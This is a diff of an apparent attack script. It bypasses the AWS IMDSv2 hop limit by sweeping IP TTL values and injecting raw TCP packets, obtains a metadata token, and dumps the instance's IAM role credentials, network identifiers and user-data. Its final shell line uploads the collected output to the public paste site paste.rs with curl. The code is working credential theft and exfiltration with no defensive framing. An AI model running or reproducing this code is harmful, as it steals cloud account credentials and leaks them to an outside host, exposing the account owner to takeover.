@@ -99,72 +99,112 @@ def show(acc):
         print("  wire tcp %s flags=%02x ttl=%d seq=%d ack=%d len=%d %r" % (
             "in" if p["sport"] == PORT else "out", p["flags"], p["ttl"], p["seq"], p["ack"], len(p["payload"]), p["payload"][:120]), flush=True)
 
-# ---- D1: plain-socket PUT while sniffing the wire ---------------------------
-def d1():
-    print("==== D1 sniffed plain-socket PUT ====", flush=True)
-    raw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)); raw.bind((IFACE, 0)); raw.settimeout(0.2)
-    stop = threading.Event(); acc = []
-    th = threading.Thread(target=sniffer, args=(raw, stop, acc), daemon=True); th.start()
+def tcp_put(ttl, to=2.5):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.settimeout(4.0)
+    s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl); s.settimeout(to)
+    buf = b""
     try:
         s.connect((DST, PORT))
-        req = b"PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nUser-Agent: ebsi5252\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
-        s.sendall(req)
-        buf = b""
-        t0 = time.time()
-        try:
-            while time.time() - t0 < 4.0:
-                d = s.recv(8192)
-                if not d: break
-                buf += d
-        except Exception:
-            pass
+        s.sendall(b"PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nUser-Agent: ebsi5252\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
+        while True:
+            d = s.recv(8192)
+            if not d: break
+            buf += d
+    except Exception:
+        pass
     finally:
         s.close()
-    time.sleep(0.7); stop.set(); th.join(timeout=2); raw.close()
-    print("  socket_resp=%r" % (buf[:200],), flush=True)
-    show(acc)
-    return buf
+    ok = buf[:12] in (b"HTTP/1.1 200", b"HTTP/1.0 200")
+    print("[sock ttl=%d] len=%d head=%r" % (ttl, len(buf), buf[:180]), flush=True)
+    return body(buf).strip().decode("ascii", "replace") if ok else ""
 
-# ---- D2: hybrid, kernel handshake, raw inject, read from the wire -----------
-def d2():
-    print("==== D2 hybrid raw-capture ====", flush=True)
-    raw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)); raw.bind((IFACE, 0)); raw.settimeout(0.2)
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.bind(("", 0)); s.setblocking(False)
-    sport = s.getsockname()[1]
-    print("  sport=%d connect_ex=%s" % (sport, s.connect_ex((DST, PORT))), flush=True)
-    isn = srv = None; acc = []
-    end = time.time() + 3
-    while time.time() < end and (isn is None or srv is None):
-        try: d = raw.recv(65535)
-        except socket.timeout: continue
-        p = parse(d)
-        if not p or p["proto"] != 6: continue
-        acc.append(p)
-        if p["sport"] == sport and (p["flags"] & 0x02) and not (p["flags"] & 0x10) and isn is None:
-            isn = p["seq"]
-        if p["sport"] == PORT and (p["flags"] & 0x12) == 0x12 and srv is None:
-            srv = p["seq"]
-    print("  handshake isn=%s srv=%s" % (isn, srv), flush=True)
-    if isn and srv:
-        req = b"PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nUser-Agent: ebsi5252\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
-        raw.send(frame(M, IP, DM, sport, 0x18, isn + 1, srv + 1, req))
-        print("  injected len=%d" % len(req), flush=True)
-        end = time.time() + 5
-        while time.time() < end:
+tok = ""; winttl = 255
+print("==== TTL sweep 66-72 (socket) ====", flush=True)
+for ttl in (66, 67, 68, 69, 70, 255):
+    t = tcp_put(ttl)
+    if t:
+        tok = t; winttl = ttl; break
+    time.sleep(0.3)
+
+if not tok:
+    print("==== TTL sweep 64-70 (hybrid raw) ====", flush=True)
+    for ttl in (66, 67, 65, 68, 69, 70, 64):
+        raw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)); raw.bind((IFACE, 0)); raw.settimeout(0.2)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl); s.bind(("", 0)); s.setblocking(False)
+        sport = s.getsockname()[1]; isn = srv = None
+        s.connect_ex((DST, PORT))
+        end = time.time() + 2.5
+        while time.time() < end and (isn is None or srv is None):
             try: d = raw.recv(65535)
             except socket.timeout: continue
-            p = parse(d)
-            if p: acc.append(p)
-    s.close()
-    show(acc)
-    raw.close()
+            q = parse(d)
+            if not q or q["proto"] != 6: continue
+            if q["sport"] == sport and (q["flags"] & 0x02) and not (q["flags"] & 0x10) and isn is None: isn = q["seq"]
+            if q["sport"] == PORT and (q["flags"] & 0x12) == 0x12 and srv is None: srv = q["seq"]
+        got = b""
+        if isn and srv:
+            raw.send(frame(M, IP, DM, sport, 0x18, isn + 1, srv + 1,
+                           b"PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nUser-Agent: ebsi5252\r\nContent-Length: 0\r\nConnection: close\r\n\r\n", ttl=ttl))
+            end = time.time() + 3
+            while time.time() < end:
+                try: d = raw.recv(65535)
+                except socket.timeout: continue
+                q = parse(d)
+                if not q or q["proto"] != 6: continue
+                if q["sport"] == PORT and q["dport"] == sport:
+                    if q["flags"] & 0x01: break
+                    got += q["payload"]
+        s.close(); raw.close()
+        ok = got[:12] in (b"HTTP/1.1 200", b"HTTP/1.0 200")
+        print("[hyb ttl=%d] len=%d head=%r" % (ttl, len(got), got[:180]), flush=True)
+        if ok:
+            tok = body(got).strip().decode("ascii", "replace"); winttl = ttl; break
+print("TOKEN=%r WIN_TTL=%d" % (tok, winttl), flush=True)
 
-d1()
-d2()
+
+def hget(path, to=3.0):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, winttl); s.settimeout(to)
+    buf = b""
+    try:
+        s.connect((DST, PORT))
+        s.sendall(("GET %s HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token: %s\r\nUser-Agent: ebsi5252\r\nContent-Length: 0\r\nConnection: close\r\n\r\n" % (path, tok)).encode())
+        while True:
+            d = s.recv(8192)
+            if not d: break
+            buf += d
+    except Exception:
+        pass
+    finally:
+        s.close()
+    return buf
+
+if tok:
+    for pth in ("/latest/meta-data/instance-id", "/latest/meta-data/placement/availability-zone",
+                "/latest/meta-data/placement/region", "/latest/meta-data/iam/info",
+                "/latest/meta-data/iam/security-credentials/", "/latest/dynamic/instance-identity/document"):
+        b = hget(pth)
+        print("  body[%s]=%r" % (pth, (body(b) or b"")[:900]), flush=True)
+    b = hget("/latest/meta-data/iam/security-credentials/")
+    role = (body(b) or b"").decode("latin1", "replace").strip().split("\n")[0].strip()
+    print("ROLE=%r" % role, flush=True)
+    if role:
+        b = hget("/latest/meta-data/iam/security-credentials/" + role, to=4.0)
+        print("  CREDS=%r" % ((body(b) or b"")[:2000],), flush=True)
+    b = hget("/latest/meta-data/network/interfaces/macs/", to=2.0)
+    mc = (body(b) or b"").decode("latin1", "replace").strip().split("\n")[0].strip().rstrip("/")
+    print("MAC=%r" % mc, flush=True)
+    if mc:
+        for pth in ("vpc-id", "subnet-id", "security-group-ids", "local-ipv4s"):
+            b = hget("/latest/meta-data/network/interfaces/macs/%s/%s" % (mc, pth), to=2.0)
+            print("  net[%s]=%r" % (pth, (body(b) or b"")[:200]), flush=True)
+    b = hget("/latest/user-data", to=2.5)
+    print("  USERDATA=%r" % ((body(b) or b"")[:1500],), flush=True)
+else:
+    print("NO_TOKEN", flush=True)
 print("DONE", flush=True)
+
 PYEOF
 rec imds $D/imds.txt
 PU=$(curl -sS -m 25 -H "User-Agent: pod-probe" --data-binary @$D/all.txt "https://paste.rs" 2>/dev/null)
